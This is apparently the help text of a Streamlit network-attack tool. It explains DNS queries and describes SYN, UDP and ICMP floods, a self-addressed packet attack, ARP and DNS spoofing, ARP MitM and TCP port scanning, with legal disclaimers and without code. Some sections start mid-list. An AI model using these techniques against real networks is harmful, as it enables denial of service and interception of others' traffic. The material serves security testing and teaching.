        st.write("""
        **What are DNS Queries?**  
        DNS (Domain Name System) queries are essential in converting human-readable domain names (like `secdev.org`) into machine-readable IP addresses. This process enables browsers and other applications to locate and connect to web servers and services efficiently.

        **Workflow of a DNS Query:**  
        1. **User Input**: You enter a domain name and select the desired record type (e.g., A, AAAA, MX).
        2. **DNS Resolver**: The query is sent to a DNS resolver, which is responsible for initiating the query process.
        3. **Root DNS Server**: The resolver contacts a root DNS server to find the authoritative server for the domain.
        4. **TLD Server**: The resolver queries the TLD (Top-Level Domain) server (e.g., `.org` for `secdev.org`) to find the authoritative name server.
        5. **Authoritative DNS Server**: The resolver queries the authoritative DNS server for the requested record type, retrieving the corresponding IP address or other data.
        6. **Result Returned**: Finally, the resolver returns the result to your application, allowing it to connect to the desired resource.

        **Uses and Purpose:**  
        - **Website Access**: Facilitates the connection between users and websites by resolving domain names to IP addresses.
        - **Email Routing**: MX records help in directing emails to the correct mail servers.
        - **Service Discovery**: Enables applications to discover services associated with a domain through TXT or SRV records.
        - **Network Management**: Assists in managing domains and subdomains through various record types.

        **How It Works:**  
        - The DNS system operates on a hierarchical structure, with various types of records serving different purposes. For example:
            - **A Record**: Maps a domain to its IPv4 address.
            - **AAAA Record**: Maps a domain to its IPv6 address.
            - **MX Record**: Specifies mail exchange servers for handling email for the domain.
            - **TXT Record**: Allows domain administrators to add arbitrary text to the DNS records, often used for verification purposes.

        With this understanding, you're equipped to perform DNS queries effectively!

        - **How It Works**: The system receives a packet that appears to originate from itself, which can result in a denial-of-service (DoS).
        - **Usage**: This attack tests how the target handles improper source and destination addressing.

        ---

        ***Advanced Attacks*** üí£

        3. **SYN Flood üåä**
        - **Description**: A SYN Flood attack involves sending multiple SYN packets without completing the TCP handshake, causing the server to allocate resources and eventually leading to exhaustion.
        - **How It Works**: By continuously initiating half-open connections, the server's resources are consumed, potentially leading to denial-of-service (DoS).
        - **Usage**: This is a common attack for testing how well a server can handle large volumes of connection requests.

        4. **UDP Flood üöÄ**
        - **Description**: A UDP Flood attack sends large volumes of UDP packets to random ports on a target, overwhelming its ability to process incoming requests.
        - **How It Works**: The target system tries to handle the incoming traffic but can be overwhelmed, resulting in service disruption.
        - **Usage**: This attack tests a network's ability to handle unsolicited UDP traffic.

        5. **ICMP Flood üå©Ô∏è**
        - **Description**: This attack involves sending a high volume of ICMP echo requests (pings) to the target, flooding it with network traffic.
        - **How It Works**: The target system becomes overwhelmed by processing multiple ICMP requests, potentially leading to a denial-of-service.
        - **Usage**: Use this attack to test the target's ability to manage excessive ping requests.

        ***ARP and DNS Spoofing Attacks*** üé≠

        6. **ARP Spoofing üëæ**
        - **Description**: ARP Spoofing allows an attacker to intercept and modify traffic between two systems by poisoning the ARP cache.
        - **How It Works**: The attacker sends falsified ARP responses, tricking the network into routing traffic through the attacker‚Äôs machine, allowing for man-in-the-middle (MitM) attacks.
        - **Usage**: Useful for penetration testing to see how easily an attacker can intercept traffic on a local network.

        7. **DNS Spoofing üì°**
        - **Description**: DNS Spoofing redirects a target‚Äôs DNS requests to malicious IP addresses, allowing attackers to control the victim's browsing behavior.
        - **How It Works**: By forging DNS responses, the attacker can redirect users from legitimate websites to malicious sites, facilitating phishing and other attacks.
        - **Usage**: Used to test how secure a DNS infrastructure is against tampering.

        ---

        ### Important Considerations üìù
        - **Permissions**: These attacks may require elevated privileges. On Linux/macOS, use `sudo`; on Windows, run as Administrator.
        
        - **Stopping Flood Attacks**: Flooding attacks (such as SYN Flood, UDP Flood, and ICMP Flood) run in loops. To stop them, you must manually interrupt the process by halting the Streamlit server (Ctrl + C).

        - **Legal Disclaimer**: Ensure you have explicit permission before testing any network or system. Unauthorized use of these techniques is both illegal and unethical.

        Happy Testing, and stay secure! üîê

        **What is ARP Cache Poisoning?**  
        ARP (Address Resolution Protocol) cache poisoning is a technique used to disrupt network communications by sending false ARP messages over a local area network (LAN). This attack tricks a target device into associating the attacker's MAC address with the IP address of a legitimate device (like a gateway), allowing the attacker to intercept, modify, or drop packets intended for that device.

        **Workflow of ARP Cache Poisoning:**  
        1. **Input Client MAC**: Enter the MAC address of the target client you wish to poison.
        2. **Input Gateway IP**: Specify the IP address of the gateway you want to impersonate.
        3. **Start Poisoning**: Initiate the ARP poisoning attack to redirect traffic intended for the gateway to your device.

        **Uses and Purpose:**  
        - **Man-in-the-Middle (MitM) Attacks**: ARP cache poisoning is often used as a precursor to MitM attacks, where the attacker intercepts and possibly alters communications between two parties.
        - **Network Analysis**: Security professionals can use this technique to test the resilience of a network against such vulnerabilities and to educate users about potential risks.
        - **Traffic Sniffing**: By redirecting traffic, attackers can capture sensitive information, such as login credentials and private messages.

        **Important Note**:  
        ARP poisoning is a powerful technique that should only be used in controlled environments or with explicit permission from network owners. Unauthorized use can lead to severe legal repercussions.

        **How It Works:**  
        - The attacker sends spoofed ARP messages to the network, telling the target client that the attacker's MAC address corresponds to the gateway's IP address. 
        - As a result, the target client sends its traffic intended for the gateway to the attacker's machine instead.
        - The attacker can then relay the traffic to the actual gateway, maintaining the appearance of a normal connection while intercepting sensitive data.

        **Example Parameters**:  
        - **Client MAC**: The MAC address of the target device (e.g., `00:00:00:00:00:00`).
        - **Gateway IP**: The IP address of the legitimate gateway (e.g., `192.168.1.1`).

        **What is an ARP MitM Attack?**  
        An ARP Man-in-the-Middle (MitM) attack occurs when an attacker intercepts communication between two devices on a local area network (LAN) by exploiting the Address Resolution Protocol (ARP). By sending falsified ARP messages, the attacker can make their device appear as the intended recipient, allowing them to intercept, alter, or monitor traffic.

        **Workflow of ARP MitM Attack:**  
        1. **Input Target IPs**: Enter the IP addresses of the two targets you wish to intercept traffic between.
        2. **Initiate Attack**: Start the ARP MitM attack to begin intercepting traffic between the specified targets.

        **Uses and Purpose:**  
        - **Data Interception**: This attack allows attackers to capture sensitive data such as passwords, personal information, and other confidential communications.
        - **Network Monitoring**: Security professionals can use this technique to evaluate network security and test for vulnerabilities in real-time.
        - **Education and Awareness**: Demonstrating this attack helps users understand the importance of securing their networks against such vulnerabilities.

        **Important Note**:  
        ARP MitM attacks can lead to serious security breaches and should only be conducted in authorized environments for educational or security assessment purposes. Unauthorized use can result in severe legal consequences.

        **How It Works:**  
        - The attacker sends spoofed ARP packets to both target devices, informing them that the attacker‚Äôs MAC address corresponds to the IP address of the other target.
        - As a result, both targets believe they are communicating directly with each other, while in reality, their traffic is routed through the attacker‚Äôs device.

        TCP port scanning is a technique used to identify open ports and services available on a target device or server. By scanning ports, you can gain insights into the network's security posture, identify potential vulnerabilities, and understand which services are actively running.

        **Workflow of TCP Port Scanning:**  
        1. **Input Target IP**: Enter the IP address of the target device you want to scan.
        2. **Select Ports**: Choose from a list of common ports or enter custom ports you wish to scan.
        3. **Initiate Scan**: Click the button to start scanning the selected ports on the target device.

        **Uses and Purpose:**  
        - **Security Assessment**: Identify open ports to evaluate the security of a network and detect potential vulnerabilities.

        - **Network Troubleshooting**: Determine connectivity issues and verify if the necessary services are accessible on the target device.

        **How It Works:**  
        - The scanner sends TCP SYN packets to the specified ports on the target IP.
        - If a port responds with a SYN-ACK packet, it indicates that the port is open and a service is listening on that port.
        - Ports that respond with RST packets are considered closed, while ports that do not respond are classified as filtered or stealth.
